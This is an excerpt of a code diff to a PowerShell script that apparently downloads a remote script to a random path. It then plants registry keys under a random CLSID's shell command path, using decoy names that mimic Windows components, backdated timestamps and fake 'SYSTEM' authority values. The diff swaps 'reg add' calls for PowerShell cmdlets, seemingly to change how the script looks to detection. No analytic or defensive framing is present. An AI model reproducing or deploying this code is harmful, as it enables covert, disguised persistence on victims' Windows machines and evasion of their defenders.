@@ -8,9 +8,8 @@ $initServiceFwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initServiceFwdmonPath = "$initServiceFwdmonPath\init_service_fwdmon.ps1"
 $g = "{$([guid]::NewGuid().ToString().ToUpper())}"
 $basePath = "HKCU\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system"
-#New-Item -Path "$basePath" -Force
-reg add "$basePath" /v "mode" /t REG_DWORD /d 0xFFFFFFFF /f
-#New-ItemProperty -Path "$basePath" -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
+New-Item -Path "$basePath" -Force
+New-ItemProperty -Path "$basePath" -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
 $ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs") 
 $p = Get-Random -Count 5 -In (1..100)
 $score = Get-Random -Minimum 1 -Maximum 100
@@ -26,24 +25,19 @@ iwr -Uri $initServiceFwdmonUri -OutFile $initServiceFwdmonPath
     $curr = $_
     if($p.Contains($curr)){
         $idx = 0..($p.Count - 1) | Where-Object { $p[$_] -eq $curr }
-        # New-Item -Path "$basePath\$($ms[$idx])" -Force | Out-Null
-        # New-ItemProperty -Path "$basePath\$($ms[$idx])" -Name "LastUpdated" -Value (Get-Date ((Get-Date).AddDays(-23)) -Format "yyyyMMdd") -Force
-        # New-ItemProperty -Path "$basePath\$($ms[$idx])" -Name "Authority" -Value "SYSTEM" -Force
-        reg add "$basePath\$($ms[$idx])" /v "LastUpdated" /t REG_SZ /d (Get-Date ((Get-Date).AddDays(-23)) -Format "yyyyMMdd") /f
-        reg add "$basePath\$($ms[$idx])" /v "Authority" /t REG_SZ /d "SYSTEM" /f
+        New-Item -Path "$basePath\$($ms[$idx])" -Force | Out-Null
+        New-ItemProperty -Path "$basePath\$($ms[$idx])" -Name "LastUpdated" -Value (Get-Date ((Get-Date).AddDays(-23)) -Format "yyyyMMdd") -Force
+        New-ItemProperty -Path "$basePath\$($ms[$idx])" -Name "Authority" -Value "SYSTEM" -Force
     }
     if($curr -eq $score){   
-        # New-Item -Path "$basePath\yXureYzQpIRLN" -Force | Out-Null  
-        reg add "$basePath\yXureYzQpIRLN" /f
+        New-Item -Path "$basePath\yXureYzQpIRLN" -Force | Out-Null  
     }
 
 
     $subName = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 13 | % { [char]$_ })
-    # New-Item -Path "$basePath\$subName" -Force | Out-Null
-    # New-ItemProperty -Path "$basePath\$subName" -Name "LastUpdated" -Value (Get-Date ((Get-Date).AddDays(-23)) -Format "yyyyMMdd") -Force | Out-Null
-    # New-ItemProperty -Path "$basePath\$subName" -Name "ThreadingModel" -Value "Apartment" -Force | Out-Null
-    reg add "$basePath\$subName" /v "LastUpdated" /t REG_SZ /d (Get-Date ((Get-Date).AddDays(-23)) -Format "yyyyMMdd") /f
-    reg add "$basePath\$subName" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
+    New-Item -Path "$basePath\$subName" -Force | Out-Null
+    New-ItemProperty -Path "$basePath\$subName" -Name "LastUpdated" -Value (Get-Date ((Get-Date).AddDays(-23)) -Format "yyyyMMdd") -Force | Out-Null
+    New-ItemProperty -Path "$basePath\$subName" -Name "ThreadingModel" -Value "Apartment" -Force | Out-Null
 }
 
 
